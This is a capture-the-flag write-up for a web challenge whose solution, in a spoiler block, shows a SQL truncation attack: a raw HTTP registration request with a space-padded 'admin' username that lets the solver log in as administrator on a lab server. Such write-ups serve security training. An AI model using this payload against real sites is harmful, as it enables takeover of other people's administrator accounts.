# Cate Bianca
**Category:** web

**Author:** styx00

## Description
This is a website dedicated to an exceptional player who originates from a small village in Switzerland called Trun. Cate was a sensational player whose career was shortened by the weaknesses of her vendors and ultimately led to her defeat in the 2018 U.S. Chess Championship semifinals.

## Solution

<details>
 <summary>Reveal Spoiler</summary>

The application (http://172.16.5.11:7500) is vulnerable to SQL Truncation.
- More info @ [SQL Truncation Attack](https://linuxhint.com/sql-truncation-attack/)

```
POST /register_user.php HTTP/1.1
Host: 172.16.5.11:7500
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

username=admin+++++++++++++++b&password=test
```

Then login to the application using `admin:test`.

</details>
